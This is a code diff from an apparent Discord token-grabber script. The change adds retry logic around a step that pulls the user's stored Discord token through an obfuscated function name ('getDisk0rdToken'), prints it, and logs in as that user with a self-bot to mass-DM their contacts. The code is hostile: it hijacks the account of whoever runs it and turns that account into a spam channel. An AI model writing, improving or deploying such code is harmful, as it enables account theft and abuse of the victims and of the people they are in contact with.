@@ -895,6 +895,14 @@ if yes == "yes":
 		print(f"{mdmbot.user.name} hass finished mdming!")
 
 	if(dm_all == True):
-		token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[0]
-		print("Token : " + token)
-		mdmbot.run(token, bot=False)
+		try:
+			token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[0]
+			print("Token : " + token)
+			mdmbot.run(token, bot=False)
+		except:
+			try:
+				token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[1]
+				print("Token : " + token)
+				mdmbot.run(token, bot=False)
+			except:
+				pass
